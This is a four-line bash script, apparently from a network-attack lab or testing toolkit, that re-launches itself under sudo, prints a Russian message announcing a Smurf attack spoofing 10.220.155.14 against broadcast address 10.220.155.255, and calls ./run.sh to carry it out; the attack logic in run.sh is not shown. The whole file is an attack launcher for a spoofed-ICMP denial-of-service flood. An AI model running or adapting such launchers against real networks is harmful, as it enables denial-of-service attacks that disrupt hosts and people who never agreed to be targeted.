#!/bin/bash
[ "$EUID" -ne 0 ] && exec sudo bash "$0" "$@"
echo 'Атака Smurf: подмена IP на 10.220.155.14 -> 10.220.155.255...'
./run.sh 5 smurf 10.220.155.14 10.220.155.255 10